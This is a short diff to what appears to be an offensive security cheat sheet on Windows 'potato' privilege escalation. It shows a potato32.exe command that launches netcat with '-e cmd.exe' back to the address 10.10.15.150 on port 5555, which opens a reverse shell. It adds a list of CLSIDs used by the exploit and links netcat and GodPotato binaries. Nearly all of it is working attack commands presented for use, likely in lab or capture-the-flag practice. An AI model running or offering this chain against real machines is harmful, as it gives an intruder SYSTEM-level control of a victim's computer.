@@ -607,6 +607,13 @@ Get the netcat exe from: https://github.com/int0x33/nc.exe/
 potato32.exe -t * -l 1337 -p C:\Users\Public\nc.exe -a "-e cmd.exe 10.10.15.150 5555" -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
 ```
 
+Well-known CLSIDs
+
+```
+{4991d34b-80a1-4291-83b6-3328366b9097}
+{e60687f7-01a1-40aa-86ac-db1cbf673334}
+```
+
 ## Get GodPotato (Use this)
 
 Link: https://github.com/BeichenDream/GodPotato?source=post_page-----10b91a94c580---------------------------------------
